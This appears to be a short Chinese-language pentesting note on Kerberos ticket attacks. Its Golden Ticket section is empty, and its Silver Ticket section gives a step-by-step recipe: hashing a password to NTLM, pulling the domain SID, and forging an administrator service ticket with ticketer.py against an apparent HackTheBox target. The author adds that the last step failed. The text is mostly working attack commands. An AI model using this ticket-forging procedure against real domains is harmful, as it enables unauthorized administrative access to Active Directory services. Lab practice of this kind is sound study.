# 票据攻击

## 黄金票据

TODO

## 白银票据

当攻击者拥有指定服务的密钥，就能够伪造高权限的PAC，然后把其封装在ST里，并对其进行PAC_SERVER_CHECKSUM签名和加密。客户端再利用这个ST以高权限访问指定服务。这个攻击过程被称为白银票据传递攻击。



创建白银票据需要知道：

- 目标服务的密钥（即NTLM hash）
- 域的SID值
- 域名
- 要伪造的域用户，一般是Administrator。



1.得到密码（如果知道密码的话）：

```shell
python2
import hashlib
hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest().encode('hex')
```

2.获得域的SID值：

```shell
Get-ADDomain | fl DomainSID
```

3.得到票据：

```shell
python3.10 ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -spn MSSQLSvc/dc.sequel.htb -domain sequel.htb -domain-sid S-1-5-21-4078382237-1492182817-2568127209 administrator
```

```shell
export KRB5CCNAME=administrator.ccache
```

接下来使用smbexec.py等脚本的时候指定-k参数即可（但是为什么没打通。。。）。

